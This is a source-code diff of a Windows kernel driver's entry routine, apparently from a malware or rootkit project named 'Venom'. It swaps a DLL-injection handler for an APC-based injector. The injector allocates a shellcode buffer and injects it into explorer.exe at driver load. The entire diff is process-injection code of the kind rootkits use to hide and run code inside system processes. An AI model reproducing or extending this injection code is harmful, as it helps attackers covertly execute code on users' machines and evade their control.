@@ -1,4 +1,5 @@
-#include "UMInjectionHandler.h"
+//#include "UMInjectionHandler.h"
+#include "Capabilities/InjectionCapabilities/APCInjector.h"
 #include "Venom.h"
 #include "IoctlHandlers.h"
 #include "Ioctl.h"
@@ -50,11 +51,15 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	//}
 
 	// Inject user mode dll to explorer.exe
-	UNICODE_STRING ProcessName = RTL_CONSTANT_STRING(L"explorer.exe");
-	HANDLE pid = UMInjectionHandler::getProcessId(ProcessName);
+	UNICODE_STRING processName = RTL_CONSTANT_STRING(L"explorer.exe");
+	//HANDLE pid = UMInjectionHandler::getProcessId(ProcessName);
+	auto shellcode = NonPagedBuffer(30);
+	auto process = Process(processName);
+	auto apcInjector = APCInjector(process, shellcode);
 	::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
 
-	status = UMInjectionHandler::injectDll(HandleToUlong(pid));
+	status = apcInjector.inject();
+	//status = UMInjectionHandler::injectDll(HandleToUlong(pid));
 	if (!NT_SUCCESS(status)) {
 		return status;
 	}
